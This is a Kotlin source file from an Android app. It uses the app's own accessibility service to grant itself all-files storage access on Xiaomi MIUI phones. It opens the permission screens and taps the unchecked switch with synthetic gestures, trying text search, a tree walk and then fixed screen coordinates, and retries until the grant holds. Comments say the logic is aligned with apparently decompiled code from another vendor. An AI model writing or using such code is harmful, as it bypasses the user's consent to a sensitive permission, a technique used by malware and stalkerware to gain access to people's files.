package com.storm.safe.rock.service.modules.yw5xud.miui

import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
import com.storm.safe.rock.service.modules.yw5xud.common.SwitchNodeFinder

/**
 * MiuiAllFilesAccess -- Phase 4 ALL_FILES (MANAGE_EXTERNAL_STORAGE) delegate.
 * 4-level fallback strategy aligned with vendor C0367a4.m212254b3 (lines 1740-2172).
 *
 * Extracted from MiuiSteps.executeAllFilesAccess().
 */
class MiuiAllFilesAccess(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: MiuiSteps
) {
    companion object {
        private const val TAG = "MiuiAllFiles"
    }

    // ━━━━━━━━━ Early-exit checks ━━━━━━━━━

    internal fun isSdkSupported(): Boolean = android.os.Build.VERSION.SDK_INT >= 30

    internal fun isAlreadyGranted(): Boolean {
        return try { android.os.Environment.isExternalStorageManager() } catch (_: Exception) { false }
    }

    // ━━━━━━━━━ Intent launch ━━━━━━━━━

    internal fun launchPredwarmIntent(logs: MutableList<String>): Boolean {
        return try {
            val pkg = context.packageName
            val pre = if (android.os.Build.VERSION.SDK_INT < 35) {
                android.content.Intent().apply {
                    component = android.content.ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.appmanager.ApplicationsDetailsActivity"
                    )
                    putExtra("package_name", pkg)
                    flags = MiuiConstants.ALL_FILES_PREDWARM_FLAGS
                }
            } else {
                android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:$pkg")
                    flags = MiuiConstants.ALL_FILES_PREDWARM_FLAGS
                }
            }
            context.startActivity(pre)
            true
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            logs.add("MIUI ALL_FILES: predwarm failed ${e.message}")
            false
        }
    }

    internal fun launchMainIntent(logs: MutableList<String>): Boolean {
        return try {
            val main = android.content.Intent(
                android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
            ).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                flags = MiuiConstants.ALL_FILES_MAIN_FLAGS
            }
            context.startActivity(main)
            true
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            logs.add("MIUI ALL_FILES: main Intent failed ${e.message}")
            false
        }
    }

    // ━━━━━━━━━ 4-level fallback strategies ━━━━━━━━━

    /**
     * L1: Find text keyword -> walk parent chain -> find unchecked Switch -> gesture tap.
     * Uses UiAutomation.queryAll (GKD selector) instead of raw findAccessibilityNodeInfosByText.
     */
    internal suspend fun tryLevel1TextToggle(): Boolean {
        for (keyword in MiuiConstants.ALL_FILES_KEYWORDS) {
            val nodes = ui.queryAll("[text*=\"$keyword\"][visibleToUser=true]")
            for (n in nodes) {
                var p: android.view.accessibility.AccessibilityNodeInfo? = n
                for (depth in 0..5) {
                    if (p == null) break
                    val sw = SwitchNodeFinder.findFirstUnchecked(p)
                    if (sw != null) {
                        val r = android.graphics.Rect()
                        sw.getBoundsInScreen(r)
                        if (r.width() > 0 && r.height() > 0) {
                            val svc = service ?: return false
                            if (GestureTapHelper.performTap(
                                    svc, r.exactCenterX(), r.exactCenterY(),
                                    GestureTapHelper.TAP_DURATION_MS_SHORT
                                )
                            ) {
                                return true
                            }
                        }
                    }
                    p = try { p.parent } catch (_: Exception) { null }
                }
            }
        }
        return false
    }

    /**
     * L2: DFS from root to find first unchecked Switch -> gesture tap.
     * 4 rounds with 100ms delay between retries.
     */
    internal suspend fun tryLevel2DfsToggle(): Boolean {
        for (round in 0..3) {
            val root = ui.root() ?: return false
            val sw = SwitchNodeFinder.findFirstUnchecked(root)
            if (sw == null) {
                kotlinx.coroutines.delay(100L)
                continue
            }
            val r = android.graphics.Rect()
            sw.getBoundsInScreen(r)
            if (r.width() > 0 && r.height() > 0) {
                val svc = service ?: return false
                if (GestureTapHelper.performTap(
                        svc, r.exactCenterX(), r.exactCenterY(),
                        GestureTapHelper.TAP_DURATION_MS_SHORT
                    )
                ) {
                    return true
                }
            }
        }
        return false
    }

    /**
     * L3: Fixed coordinate fallback — tap at vendor-defined screen ratio.
     */
    internal suspend fun tryLevel3CoordFallback(
        coordX: Float,
        coordY: Float,
        logs: MutableList<String>
    ): Boolean {
        val svc = service ?: return false
        val ok = GestureTapHelper.performTap(svc, coordX, coordY, MiuiConstants.ALL_FILES_COORD_DURATION_MS)
        logs.add("MIUI ALL_FILES: L3 coord ($coordX,$coordY) dur=${MiuiConstants.ALL_FILES_COORD_DURATION_MS}ms")
        return ok
    }

    /**
     * L4: Verify Environment.isExternalStorageManager() with polling.
     */
    internal suspend fun verifyGranted(): Boolean {
        for (v in 0 until MiuiConstants.ALL_FILES_VERIFY_ROUNDS) {
            kotlinx.coroutines.delay(MiuiConstants.ALL_FILES_VERIFY_DELAY_MS)
            if (isAlreadyGranted()) return true
        }
        return false
    }

    // ━━━━━━━━━ Orchestrator ━━━━━━━━━

    /**
     * MIUI ALL_FILES authorization flow. Aligned with vendor C0367a4.m212254b3.
     *
     * 4-level fallback:
     *  L1 text toggleCheckBox(keyword)
     *  L2 DFS findFirstUnchecked Switch + gesture tap 50ms
     *  L3 fixed coordinate (w*0.875, h*0.225) gesture tap 100ms
     *  L4 3 x 150ms verify Environment.isExternalStorageManager()
     * Outer retry 3 times (i=0..2), each reopens main Intent.
     *
     * @return true if Environment.isExternalStorageManager() == true
     */
    @Suppress("DEPRECATION")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        if (!isSdkSupported()) {
            logs.add("MIUI ALL_FILES: SDK<30 skip")
            return false
        }
        if (isAlreadyGranted()) {
            logs.add("MIUI ALL_FILES: already granted")
            successes.add("all_files_access")
            return true
        }

        val dm = context.resources.displayMetrics
        val coordX = dm.widthPixels * MiuiConstants.ALL_FILES_COORD_X_RATIO
        val coordY = dm.heightPixels * MiuiConstants.ALL_FILES_COORD_Y_RATIO

        val overallStart = System.currentTimeMillis()
        for (attempt in 0 until MiuiConstants.ALL_FILES_OUTER_RETRIES) {
            val elapsed = System.currentTimeMillis() - overallStart
            if (elapsed >= MiuiConstants.ALL_FILES_OVERALL_TIMEOUT_MS) {
                logs.add("MIUI ALL_FILES: timeout ${MiuiConstants.ALL_FILES_OVERALL_TIMEOUT_MS}ms (elapsed ${elapsed}ms), skip remaining retries")
                failures.add("all_files_access: timeout after ${elapsed}ms")
                return false
            }
            logs.add("MIUI ALL_FILES: outer retry ${attempt + 1}/${MiuiConstants.ALL_FILES_OUTER_RETRIES} (elapsed ${elapsed}ms)")

            launchPredwarmIntent(logs)
            kotlinx.coroutines.delay(300L)
            if (!launchMainIntent(logs)) continue
            kotlinx.coroutines.delay(1500L)

            val clicked = tryLevel1TextToggle() || tryLevel2DfsToggle()
            if (!clicked) {
                tryLevel3CoordFallback(coordX, coordY, logs)
            }

            if (verifyGranted()) {
                successes.add("all_files_access")
                logs.add("MIUI ALL_FILES: granted (outer ${attempt + 1})")
                return true
            }
        }

        failures.add("all_files_access")
        logs.add("MIUI ALL_FILES: failed after ${MiuiConstants.ALL_FILES_OUTER_RETRIES} outer retries")
        return false
    }
}
